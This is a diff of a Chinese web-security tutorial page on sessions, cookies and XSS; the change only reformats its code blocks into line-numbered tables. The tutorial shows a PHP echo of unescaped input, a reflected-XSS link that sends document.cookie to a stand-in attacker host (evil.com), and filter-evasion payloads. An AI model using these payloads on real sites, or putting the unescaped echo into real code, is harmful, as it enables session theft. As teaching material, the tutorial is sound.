@@ -284,8 +284,15 @@ if (!doNotTrack) {
 <ol>
 <li>
 <p>保存在本地html中的隐藏内容 (过时) <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">INPUT</span> <span class="na">TYPE</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">NAME</span><span class="o">=</span><span class="s">&#34;sessionid&#34;</span> <span class="na">VALUE</span><span class="o">=</span><span class="s">&#34;7456&#34;</span><span class="p">&gt;</span>
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">INPUT</span> <span class="na">TYPE</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">NAME</span><span class="o">=</span><span class="s">&#34;sessionid&#34;</span> <span class="na">VALUE</span><span class="o">=</span><span class="s">&#34;7456&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>Cookie (后面展开) <!-- raw HTML omitted --></p>
 </li>
@@ -299,12 +306,23 @@ if (!doNotTrack) {
 </li>
 <li>
 <p>HTTP header (e.g., cookie) <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /page.php HTTP/1.1 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /page.php HTTP/1.1 
 </span></span><span class="line"><span class="cl">Host: www.example.com 
 </span></span><span class="line"><span class="cl">...
 </span></span><span class="line"><span class="cl">Cookie: sessionid=7456 
 </span></span><span class="line"><span class="cl">...
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>慢慢的Cooike开始被广泛的使用，但是cookie有大小的限制（maximum size: 4096bytes）,无法存储太多的内容，那么我们为什么不在服务端来存储这些信息呢，这样也更安全，信息也可以更方便的被利用。 <!-- raw HTML omitted --></p>
 <p>那么又多了一个问题，就是服务端存储了这些内容，那么客户端告诉服务端自己需要的是哪一个session的内容呢？这些就需要服务端在开启一个session（例如用户登录的时候）的时候，返回给客户端一个 <code>sessionId</code> ，之后每次客户端发出HTTP请求的时候，都带上这个  <code>sessionId</code> ，服务端就知道了是谁要访问什么信息了，然后当用户登出的时候，就自动删除session的内容节省内存（历史信息存储到数据库中）。 <!-- raw HTML omitted --></p>
@@ -351,19 +369,42 @@ if (!doNotTrack) {
 <ol>
 <li>
 <p>服务器上有一个页面的叫做 <code>xss_test.php</code> ，其中有一段代码要求用户输入用户名，输入的用户名会返回到页面上 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Welcome</span> <span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;inject&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Welcome</span> <span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;inject&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>用户点击了一条恶意修改的网页链接 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;document.location= &#39;http://evil.com/log.php?&#39;+document.cookie&lt;/script&gt;
-</span></span></code></pre></div><p>我们可以看到这里inject参数被设置为了 <code>script</code> tag的代码来访问攻击者的域名并提供当前网页所拥有的cookie的值 <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;document.location= &#39;http://evil.com/log.php?&#39;+document.cookie&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以看到这里inject参数被设置为了 <code>script</code> tag的代码来访问攻击者的域名并提供当前网页所拥有的cookie的值 <!-- raw HTML omitted --></p>
 </li>
 <li>
 <p>在用户点击之后，浏览器就会生成HTTP请求向服务器寻求资源，其中就包含了攻击者所包含的恶意代码 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27ht tp%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E 
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27ht tp%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E 
 </span></span><span class="line"><span class="cl">Host: www.example.com 
 </span></span><span class="line"><span class="cl">...
-</span></span></code></pre></div></li>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>服务端的脚本通过将原本应该为用户名的内容拼接成html返回给用户，然后由浏览器自动解析执行，导致恶意代码被执行，用户的cookie被返回给了攻击者的网站，造成了泄露 <!-- raw HTML omitted --></p>
 </li>
@@ -373,16 +414,37 @@ if (!doNotTrack) {
 <ul>
 <li>
 <p>Url encoding: <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%63%69%61%6F%27%29%3B%3C%2F%73%63%72%69%70%74%3E
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%63%69%61%6F%27%29%3B%3C%2F%73%63%72%69%70%74%3E
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>不使用 <code>&lt;script&gt;</code> tag： <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;img%20onerror=&#34;javascript:%20alert(document.cookie);&#34;%20src=asd&gt;
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;img%20onerror=&#34;javascript:%20alert(document.cookie);&#34;%20src=asd&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>动态执行（动态的构建恶意代码的内容） <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,99,105,97,111,39,41,59))&lt;/script&gt;
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,99,105,97,111,39,41,59))&lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
 <p>我们甚至可以将包含漏洞的链接通过短网址缩短或者转换为二维码来绕过检测 <!-- raw HTML omitted --></p>
 <h4 id="stored-xss-存储型-xss">Stored XSS 存储型 XSS</h4>
@@ -409,9 +471,37 @@ if (!doNotTrack) {
 <p>在介绍DOM XSS之前，我们需要首先了解一下DOM是什么： <!-- raw HTML omitted --></p>
 <p>DOM(Document object model)文档对象模型，将网页当作一个文档，并用一种树状结构存储网页中的所有的标签，以及其他的信息，并提供了API供JS等脚本语言对页面内容进行查询与修改。我们可以通过浏览器的开发者工具来查看网页的DOM内容。 <!-- raw HTML omitted --></p>
 <p>我们可以看看JS代码调用DOM API的效果，此处的window/document元素就代表着整个网页文档， <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;window.alert(&#39;welcome to my home page!&#39;);&#34;</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>还可以为网页创建标签，写入内容等信息。 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;window.alert(&#39;welcome to my home page!&#39;);&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>还可以为网页创建标签，写入内容等信息。 <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// run this function when the document is loaded
@@ -428,7 +518,9 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
 </span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="err">/body&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/html&gt;</span>
-</span></span></code></pre></div><p>那么我们回到 DOM XSS，其与前面两种XSS的最大的区别就在于，攻击的过程完全只涉及客户端，而不依赖服务器端的返回。 <!-- raw HTML omitted --></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么我们回到 DOM XSS，其与前面两种XSS的最大的区别就在于，攻击的过程完全只涉及客户端，而不依赖服务器端的返回。 <!-- raw HTML omitted --></p>
 <p>其步骤一般为： <!-- raw HTML omitted --></p>
 <ol>
 <li>攻击者构造一段含有一段直接篡改DOM结构的代码的链接然后发送给受害者 <!-- raw HTML omitted --></li>
